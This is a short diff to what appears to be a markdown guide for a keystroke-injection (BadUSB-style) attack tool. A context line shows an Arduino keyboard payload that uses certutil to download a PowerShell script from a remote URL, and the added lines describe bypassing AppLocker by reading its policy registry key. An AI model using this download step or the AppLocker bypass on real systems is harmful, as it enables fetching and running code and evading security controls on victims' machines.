@@ -239,6 +239,10 @@ Example:
 Keyboard.println(" FOR /F \"delims=/ tokens=1\" %a IN ('where certutil')DO %a -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");
 ```
 
+## Bypass AppLocker
+
+Policies of AppLocker are stored in ```HKEY_LOCAL_Machine\Software\Policies\Microsoft\Windows\SrpV2```, You can verify the folders in which you have permission to run .ps1 scripts.
+
 ### Telegram Options
 
 #### Basic
